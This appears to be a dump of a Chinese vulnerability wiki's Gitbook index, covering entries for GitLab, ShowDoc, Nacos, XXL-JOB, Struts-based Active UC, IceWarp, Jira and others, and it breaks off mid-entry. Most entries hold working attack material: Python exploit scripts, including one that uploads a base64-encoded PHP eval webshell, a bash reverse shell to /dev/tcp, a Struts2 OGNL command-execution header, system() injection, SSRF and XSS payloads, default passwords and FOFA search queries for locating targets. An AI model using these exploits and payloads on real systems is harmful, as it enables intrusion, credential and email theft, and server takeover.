用户名查询造成了邮箱泄露漏洞 查看完报告后发现漏洞利用需要有账号用户名，在不知道的情况下无法获取邮箱，在Graphql官网查看得知可以通过另一个构造的语句一次性返回所有的用户名和邮箱 发包调用了 /api/graphql 接口发送数据 完整数据包为 POST /api/graphql HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Length: 212 Content-Type: application/json {\"query\":\"{\\nusers {\\nedges {\\n node {\\n username\\n email\\n avatarUrl\\n status {\\n emoji\\n message\\n messageHtml\\n }\\n }\\n }\\n }\\n }\",\"variables\":null,\"operationName\":null} 成功返回数据，造成 Gitlab的用户邮箱信息泄露 漏洞利用POC import requests import sys import random import re import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: GitLab 13.4 - 13.6.2 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/api/graphql\" user_number = 0 headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/json\", } try: data = \"\"\" {\"query\":\"{\\\\nusers {\\\\nedges {\\\\n node {\\\\n username\\\\n email\\\\n avatarUrl\\\\n status {\\\\n emoji\\\\n message\\\\n messageHtml\\\\n }\\\\n }\\\\n }\\\\n }\\\\n }\",\"variables\":null,\"operationName\":null} \"\"\" requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data ,verify=False, timeout=5) if \"email\" in response.text and \"username\" in response.text and \"@\" in response.text and response.status_code == 200: print('\\033[32m[o] 目标{}存在漏洞, 泄露用户邮箱数据....... \\033[0m'.format(target_url)) for i in range(0,999): try: username = json.loads(response.text)[\"data\"][\"users\"][\"edges\"][i][\"node\"][\"username\"] email = json.loads(response.text)[\"data\"][\"users\"][\"edges\"][i][\"node\"][\"email\"] user_number = user_number + 1 print('\\033[34m[o] 用户名:{} 邮箱:{} \\033[0m'.format(username, email)) except: print(\"\\033[32m[o] 共泄露{}名用户邮箱账号 \\033[0m\".format(user_number)) sys.exit(0) else: print(\"\\033[31m[x] 不存在漏洞 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] 已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中 GitLab_Graphql_Email_information_disclosure.json 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/GitLab/GitLab SSRF漏洞 CVE-2021-22214.html":{"url":"book/Web应用漏洞/GitLab/GitLab SSRF漏洞 CVE-2021-22214.html","title":"GitLab SSRF漏洞 CVE-2021-22214","keywords":"","body":"GitLab SSRF漏洞 CVE-2021-22214 漏洞描述 GitLab存在前台未授权SSRF漏洞，未授权的攻击者也可以利用该漏洞执行SSRF攻击（CVE-2021-22214）。该漏洞源于对用户提供数据的验证不足，远程攻击者可通过发送特殊构造的 HTTP 请求，欺骗应用程序向任意系统发起请求。攻击者成功利用该漏洞可获得敏感数据的访问权限或向其他服务器发送恶意请求。 漏洞影响 [!NOTE] Gitlab > 10.5 FOFA [!NOTE] app=\"GitLab\" 环境搭建 http://vulfocus.fofa.so/ 漏洞复现 登录页面如下 发送请求包 POST /api/v4/ci/lint HTTP/1.1 Host: User-Agent: python-requests/2.25.0 Accept-Encoding: gzip, deflate Accept: */* Connection: keep-alive Content-Type: application/json Content-Length: 111 {\"include_merged_yaml\": true, \"content\": \"include:\\n remote: http://965qaw.dnslog.cn/api/v1/targets?test.yml\"} 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/XXL-JOB/":{"url":"book/Web应用漏洞/XXL-JOB/","title":"XXL-JOB","keywords":"","body":"XXL-JOB XXL-JOB 任务调度中心 后台默认弱口令 XXL-JOB 任务调度中心 后台任意命令执行漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/XXL-JOB/XXL-JOB 任务调度中心 后台默认弱口令.html":{"url":"book/Web应用漏洞/XXL-JOB/XXL-JOB 任务调度中心 后台默认弱口令.html","title":"XXL-JOB 任务调度中心 后台默认弱口令","keywords":"","body":"XXL-JOB 任务调度中心 后台默认弱口令 漏洞描述 XXL-JOB 任务调度中心 后台存在默认弱口令，攻击者可以在后台进一步攻击 漏洞影响 [!NOTE] XXL-JOB FOFA [!NOTE] app=\"XXL-JOB\" || title=\"任务调度中心\" 漏洞复现 使用默认口令登录 admin 123456 Goby & POC [!NOTE] 已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中 XXL_JOB_Default_password 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/XXL-JOB/XXL-JOB 任务调度中心 后台任意命令执行漏洞.html":{"url":"book/Web应用漏洞/XXL-JOB/XXL-JOB 任务调度中心 后台任意命令执行漏洞.html","title":"XXL-JOB 任务调度中心 后台任意命令执行漏洞","keywords":"","body":"XXL-JOB 任务调度中心 后台任意命令执行漏洞 漏洞描述 XXL-JOB 任务调度中心攻击者可以在后台可以通过写入shell命令任务调度获取服务器权限 漏洞影响 [!NOTE] XXL-JOB FOFA [!NOTE] app=\"XXL-JOB\" || title=\"任务调度中心\" 漏洞复现 登录后台增加一个任务 [!NOTE] 注意运行模式需要为 GLUE(shell) 点击 GLUE IDE编辑脚本 执行探测出网，和任务调用是否可执行 反弹一个shell #!/bin/bash bash -c 'exec bash -i &>/dev/tcp/xxx.xxx.xxx.xxx/9999 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/Seo-Panel/":{"url":"book/Web应用漏洞/Seo-Panel/","title":"Seo-Panel","keywords":"","body":"Seo-Panel Seo-Panel 4.8.0 反射型XSS漏洞 CVE-2021-3002 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/Seo-Panel/Seo-Panel 4.8.0 反射型XSS漏洞  CVE-2021-3002.html":{"url":"book/Web应用漏洞/Seo-Panel/Seo-Panel 4.8.0 反射型XSS漏洞  CVE-2021-3002.html","title":"Seo-Panel 4.8.0 反射型XSS漏洞  CVE-2021-3002","keywords":"","body":"Seo-Panel 4.8.0 反射型XSS漏洞 CVE-2021-3002 漏洞描述 Seo Panel是一个网站搜索引擎优化管理的完整控制面板。它包含了多个SEO工具来增加和跟踪你的网站性能 Seo-Panel 4.8.0以下版本存在过滤不完全的情况，造成存在 反射型XSS漏洞 漏洞影响 [!NOTE] Seo-Panel Version 环境搭建 https://github.com/seopanel/Seo-Panel 下载后放入网站根目录根据提示安装访问即可 漏洞复现 漏洞出现在找回密码页面 http://xxx.xxx.xxx.xxx/login.php?sec=forgot 成功弹窗 ,造成 反射型XSS 漏洞 漏洞POC 请求包如下 POST /login.php?sec=forgot HTTP/1.1 Host: 192.168.51.133 Content-Length: 118 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Origin: http://192.168.51.133 Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://192.168.51.133/login.php?sec=forgot Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: PHPSESSID=i0qk20ehq89b29ct8krpv76vn3; yzmphp_adminid=33d5DywYQIUGS13SI7x4I0y7JiCacraGcDU1uoBx; yzmphp_adminname=1fc8yAdCyAogZ-PIz4c66dU1ij0mHsG7KGF_5tToVThEzbc Connection: close sec=requestpass&email=peiqi%40peiqi.com%22%3E%3Cimg+src%3Da+onerror%3Dalert%28%22peiqi%22%29%3Egcuak&code=12345&login= 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/ShowDoc/":{"url":"book/Web应用漏洞/ShowDoc/","title":"ShowDoc","keywords":"","body":"ShowDoc ShowDoc 任意文件上传漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/ShowDoc/ShowDoc 任意文件上传漏洞.html":{"url":"book/Web应用漏洞/ShowDoc/ShowDoc 任意文件上传漏洞.html","title":"ShowDoc 任意文件上传漏洞","keywords":"","body":"ShowDoc 任意文件上传漏洞 漏洞描述 ShowDoc 存在任意文件上传漏洞，攻击者通过构造特殊的数据包可以上传恶意文件控制服务器 漏洞影响 [!NOTE] ShowDoc FOFA [!NOTE] app=\"ShowDoc\" 漏洞复现 网站首页如下 构造如下数据包上传php文件 POST /index.php?s=/home/page/uploadImg HTTP/1.1 Host: xxx.xxx.xxx.xxx User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0 Content-Length: 239 Content-Type: multipart/form-data; boundary=--------------------------921378126371623762173617 Accept-Encoding: gzip ----------------------------921378126371623762173617 Content-Disposition: form-data; name=\"editormd-image-file\"; filename=\"test.<>php\" Content-Type: text/plain ----------------------------921378126371623762173617-- 访问回显的路径 漏洞POC import requests import sys import random import base64 import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mTitle: ShowDoc 任意文件上传漏洞 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/index.php?s=/home/page/uploadImg\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)\", \"Content-Type\": \"multipart/form-data; boundary=--------------------------921378126371623762173617\" } data = base64.b64decode(\"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTkyMTM3ODEyNjM3MTYyMzc2MjE3MzYxNwpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9ImVkaXRvcm1kLWltYWdlLWZpbGUiOyBmaWxlbmFtZT0idGVzdC48PnBocCIKQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluCgo8P3BocCBlY2hvICd0ZXN0X3Rlc3QnO0BldmFsKCRfUE9TVFt0ZXN0XSk/PgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tOTIxMzc4MTI2MzcxNjIzNzYyMTczNjE3LS0=\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) if \"success\" in response.text and response.status_code == 200: webshell_url = re.findall(r'\"url\":\"(.*?)\"', response.text)[0] webshell_url = webshell_url.replace('\\\\','') response = requests.get(url=webshell_url, headers=headers,verify=False, timeout=5) if \"test_test\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞 ,成功上传木马 \\n[o] 路径为 {}\\033[0m\".format(target_url, webshell_url)) print(\"\\033[32m[o] 密码为: peiqi \\033[0m\") else: print(\"\\033[31m[x] 请求失败 \\033[0m\") sys.exit(0) else: print(\"\\033[31m[x] 上传失败 \\033[0m\") except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/Alibaba Nacos/":{"url":"book/Web应用漏洞/Alibaba Nacos/","title":"Alibaba Nacos","keywords":"","body":"Alibaba Nacos Alibaba Nacos 控制台默认弱口令 Alibaba Nacos 未授权访问漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/Alibaba Nacos/Alibaba Nacos 控制台默认弱口令.html":{"url":"book/Web应用漏洞/Alibaba Nacos/Alibaba Nacos 控制台默认弱口令.html","title":"Alibaba Nacos 控制台默认弱口令","keywords":"","body":"Alibaba Nacos 控制台默认弱口令 漏洞描述 Alibaba Nacos 控制台存在默认弱口令 nacos/nacos，可登录后台查看敏感信息 漏洞影响 [!NOTE] Alibaba Nacos 漏洞复现 发送如下请求 返回200说明成功登录 Goby & POC [!NOTE] 已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中 Alibaba_Nacos_Default_password.json 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/Alibaba Nacos/Alibaba Nacos 未授权访问漏洞.html":{"url":"book/Web应用漏洞/Alibaba Nacos/Alibaba Nacos 未授权访问漏洞.html","title":"Alibaba Nacos 未授权访问漏洞","keywords":"","body":"Alibaba Nacos 未授权访问漏洞 漏洞描述 2020年12月29日，Nacos官方在github发布的issue中披露Alibaba Nacos 存在一个由于不当处理User-Agent导致的未授权访问漏洞 。通过该漏洞，攻击者可以进行任意操作，包括创建新用户并进行登录后操作。 漏洞影响 [!NOTE] Nacos FOFA [!NOTE] title=\"Nacos\" 环境搭建 https://github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1 wget https://github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1 tar -zxvf nacos-server-2.0.0-ALPHA.1.tar.gz ./startup.sh -m standalone 然后访问 http://xxx.xxx.xxx.xxx:8848/nacos 即可，默认账号密码 nacos/nacos 漏洞复现 可以再项目的 issues 中看到大量的关于越权的安全问题的讨论 https://github.com/alibaba/nacos/issues/1105 这里我们在登录后任意一个位置看一下请求，并在未授权的情况下看是否可以访问 这里的请求url简化为 http://xxx.xxx.xxx.xxx:8848/nacos/v1/core/cluster/nodes?withInstances=false&pageNo=1&pageSize=10&keyword= 退出用户后在前台访问这个 url 可以发现以及泄露了 ip节点 等数据 同样我们查看用户列表的请求并在前台访问 http://xxx.xxx.xxx.xxx:8848/nacos/v1/auth/users?pageNo=1&pageSize=9 这里可以发现对用户的请求是完全没有过滤的，可以通过未授权的情况获取用户的敏感信息 我们尝试创建用户并抓包 返回下列创建成功 {\"code\":200,\"message\":\"create user ok!\",\"data\":null} 同样的我们简化请求 POST /nacos/v1/auth/users? username=peiqi&password=peiqi 看到有文章说要加上User-Agent请求头 User-Agent: Nacos-Server 但是大量测试之后发现好像是无关紧要的，没有请求头同样可以创建用户 [!NOTE] 同样的原理也可以用于修改密码添加配置等 漏洞利用POC [!NOTE] 注意下大部分企业的 nacos的url为 /v1/auth/users ，而不是 /nacos/v1/auth/users 可以按目标情况自行修改 import requests import sys import random from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: Nacos >> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): # vuln_url = target_url + \"/nacos/v1/auth/users\" vuln_url = target_url + \"/v1/auth/users\" headers = { \"User-Agent\": \"Nacos-Server\", \"Content-Type\": \"application/x-www-form-urlencoded\", } number = random.randint(0,999) data = \"username=peiqi{}&password=peiqi\".format(str(number)) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) print(\"\\033[32m[o] 正在请求 {}/nacos/v1/auth/users \\033[0m\".format(target_url)) if \"create user ok!\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞 \\033[0m\".format(target_url)) print(\"\\033[32m[o] 成功创建账户 peiqi{} peiqi\\033[0m\".format(str(number))) else: print(\"\\033[31m[x] 创建用户请求失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC 已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中 Alibaba_Nacos_Add_user_not_authorized.json 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/Atlassian Jira/":{"url":"book/Web应用漏洞/Atlassian Jira/","title":"Atlassian Jira","keywords":"","body":"Atlassian Jira Atlassian Jira 信息泄露漏洞 CVE-2020-14181 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/Atlassian Jira/Atlassian Jira 信息泄露漏洞 CVE-2020-14181.html":{"url":"book/Web应用漏洞/Atlassian Jira/Atlassian Jira 信息泄露漏洞 CVE-2020-14181.html","title":"Atlassian Jira 信息泄露漏洞 CVE-2020-14181","keywords":"","body":"Atlassian Jira 信息泄露漏洞 CVE-2020-14181 漏洞描述 Jira存在一个未授权访问漏洞，未授权的用户可以通过一个api接口直接查询到某用户名的存在情况，该接口不同于CVE-2019-8446和CVE-2019-3403的接口，是一个新的接口。如果Jira暴露在公网中，未授权用户就可以直接访问该接口爆破出潜在的用户名。 漏洞影响 [!NOTE] Atlassian Jira Atlassian Jira 8.0.0 - 8.5.7 Atlassian Jira 8.6.0 - 8.12.0 FOFA [!NOTE] app=\"Jira\" 漏洞复现 打开主界面，注意标识中的 Jira版本是否在影响中 使用POC对用户名是否存在进行验证 http://xxx.xxx.xxx.xxx/secure/ViewUserHover.jspa?username=admin 用户名如果不存在会返回 存在的用户名会返回 不存在漏洞会返回 漏洞利用POC [!NOTE] POC只用于探测是否存在漏洞 爆破可使用: https://github.com/Rival420/CVE-2020-14181/blob/main/cve-2020-1481.py import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: Atlassian Jira >> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/secure/ViewUserHover.jspa?username=peiqipeiqipeiqi\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) version = re.findall(r'\\((.*?)#', response.text)[0] print(\"\\033[32m[o] 目标 Jira 版本为{} \\033[0m\".format(version)) if \"peiqipeiqipeiqi\" in response.text: print(\"\\033[32m[o] 目标{}存在漏洞 \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] 目标不存在漏洞 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] 已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中 Atlassian_Jira_user_information_disclosure 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/Alibaba Canal/":{"url":"book/Web应用漏洞/Alibaba Canal/","title":"Alibaba Canal","keywords":"","body":"Alibaba Canal Alibaba Canal config 云密钥信息泄露漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/Alibaba Canal/Alibaba Canal config 云密钥信息泄露漏洞.html":{"url":"book/Web应用漏洞/Alibaba Canal/Alibaba Canal config 云密钥信息泄露漏洞.html","title":"Alibaba Canal config 云密钥信息泄露漏洞","keywords":"","body":"Alibaba Canal config 云密钥信息泄露漏洞 漏洞描述 由于/api/v1/canal/config 未进行权限验证可直接访问，导致账户密码、accessKey、secretKey等一系列敏感信息泄露 漏洞影响 [!NOTE] Alibaba Canal FOFA [!NOTE] title=\"Canal Admin\" 漏洞复现 验证漏洞的Url为 /api/v1/canal/config/1/0 其中泄露了 aliyun.access 密钥，可以控制密钥下的所有服务器 云密钥泄露参考: red.peiqi.tech 其中还含有默认口令 admin/123456 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/Active UC/":{"url":"book/Web应用漏洞/Active UC/","title":"Active UC","keywords":"","body":"Active UC Active UC index.action 远程命令执行漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/Active UC/Active UC index.action 远程命令执行漏洞.html":{"url":"book/Web应用漏洞/Active UC/Active UC index.action 远程命令执行漏洞.html","title":"Active UC index.action 远程命令执行漏洞","keywords":"","body":"Active UC index.action 远程命令执行漏洞 漏洞描述 网动统一通信平台 Active UC index.action 存在S2-045远程命令执行漏洞, 通过漏洞可以执行任意命令 漏洞影响 [!NOTE] Active UC FOFA [!NOTE] title=\"网动统一通信平台(Active UC)\" 漏洞复现 登录页面如下 发送如下请求包 POST /acenter/index.action HTTP/1.1 Cookie: SessionId=96F3F15432E0660E0654B1CE240C4C36 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) Charsert: UTF-8 Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='dir').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}; boundary=---------------------------18012721719170 Cache-Control: no-cache Pragma: no-cache Host: Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2 Connection: keep-alive Content-Length: 196 -----------------------------18012721719170 Content-Disposition: form-data; name=\"pocfile\"; filename=\"text.txt\" Content-Type: text/plain xxxxxxx -----------------------------18012721719170 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/ICEFlow/":{"url":"book/Web应用漏洞/ICEFlow/","title":"ICEFlow","keywords":"","body":"ICEFlow ICEFlow VPN 信息泄露漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/ICEFlow/ICEFlow VPN 信息泄露漏洞.html":{"url":"book/Web应用漏洞/ICEFlow/ICEFlow VPN 信息泄露漏洞.html","title":"ICEFlow VPN 信息泄露漏洞","keywords":"","body":"ICEFlow VPN 信息泄露漏洞 漏洞描述 ICEFlow VPN 存在信息泄露漏洞，攻击者可以查看日志中的敏感数据来进一步攻击系统 漏洞影响 [!NOTE] ICEFlow VPN FOFA [!NOTE] title=\"ICEFLOW VPN Router\" 漏洞复现 可访问的日志 Url 系统日志 http://url/log/system.log VPN日志 http://url/log/vpn.log 访问日志 http://url/log/access.log 告警日志 http://url/log/warn.log 错误日志 http://url/log/error.log 调试日志 http://url/log1/debug.log 移动用户日志 http://url/log/mobile.log 防火墙日志 http://url/log/firewall.log 根据日志信息获得session后，可利用实时登录系统管理后台： http://xxx.xxx.xxx.xxx/cgi-bin/index?oid=10&session_id=xxxxxxxxxxxxxx&l=0 Goby & POC [!NOTE] ICEFlow VPN 信息泄露漏洞 参考文章 https://www.uedbox.com/post/18720/ 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/IceWarp/":{"url":"book/Web应用漏洞/IceWarp/","title":"IceWarp","keywords":"","body":"IceWarp IceWarp WebClient basic 远程命令执行漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/IceWarp/IceWarp WebClient basic 远程命令执行漏洞.html":{"url":"book/Web应用漏洞/IceWarp/IceWarp WebClient basic 远程命令执行漏洞.html","title":"IceWarp WebClient basic 远程命令执行漏洞","keywords":"","body":"IceWarp WebClient basic 远程命令执行漏洞 漏洞描述 IceWarp WebClient 存在远程命令执行漏洞，攻击者构造特殊的请求即可远程命令执行 漏洞影响 [!NOTE] IceWarp WebClient FOFA [!NOTE] app=\"IceWarp-公司产品\" 漏洞复现 登录页面如下 漏洞请求包为 POST /webmail/basic/ HTTP/1.1 Host: sd.sahadharawat.com Content-Type: application/x-www-form-urlencoded Cookie: use_cookies=1 Content-Length: 43 _dlg[captcha][target]=system(\\'ipconfig\\')\\ 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/Jupyter Notebook/":{"url":"book/Web应用漏洞/Jupyter Notebook/","title":"Jupyter Notebook","keywords":"","body":"Jupyter Notebook 未授权访问远程命令执行漏洞 Jupyter Notebook 未授权访问远程命令执行漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/Jupyter Notebook/Jupyter Notebook 未授权访问远程命令执行漏洞.html":{"url":"book/Web应用漏洞/Jupyter Notebook/Jupyter Notebook 未授权访问远程命令执行漏洞.html","title":"Jupyter Notebook 未授权访问远程命令执行漏洞","keywords":"","body":"Jupyter Notebook 未授权访问远程命令执行漏洞 漏洞描述 Jupyter Notebook（此前被称为 IPython notebook）是一个交互式笔记本，支持运行 40 多种编程语言。 如果管理员未为Jupyter Notebook配置密码，将导致未授权访问漏洞，游客可在其中创建一个console并执行任意Python代码和命令。 漏洞影响 [!NOTE] Jupyter Notebook FOFA [!NOTE] app=\"Jupyter-Notebook\" && body=\"Terminal\" 漏洞复现 访问目标, 点击 Terminal 打开命令行界面 执行命令并反弹shell 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/MessageSolution/":{"url":"book/Web应用漏洞/MessageSolution/","title":"MessageSolution","keywords":"","body":"MessageSolution MessageSolution 邮件归档系统EEA 信息泄露漏洞 CNVD-2021-10543 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/MessageSolution/MessageSolution  邮件归档系统EEA 信息泄露漏洞 CNVD-2021-10543.html":{"url":"book/Web应用漏洞/MessageSolution/MessageSolution  邮件归档系统EEA 信息泄露漏洞 CNVD-2021-10543.html","title":"MessageSolution  邮件归档系统EEA 信息泄露漏洞 CNVD-2021-10543","keywords":"","body":"MessageSolution 邮件归档系统EEA 信息泄露漏洞 CNVD-2021-10543 漏洞描述 MessageSolution企业邮件归档管理系统 EEA是北京易讯思达科技开发有限公司开发的一款邮件归档系统。该系统存在通用WEB信息泄漏，泄露Windows服务器administrator hash与web账号密码 漏洞影响 [!NOTE] MessageSolution 企业邮件归档管理系统EEA FOFA [!NOTE] title=\"MessageSolution Enterprise Email Archiving (EEA)\" 漏洞复现 登录页面如下 访问如下Url http://xxx.xxx.xxx.xxx/authenticationserverservlet/ 使用获得到的密码可以登录系统 漏洞利用POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: MessageSolution 企业邮件归档管理系统EEA \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/authenticationserverservlet/\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if response.status_code == 200 and \"administrator\" in response.text: print(\"\\033[32m[o] 目标 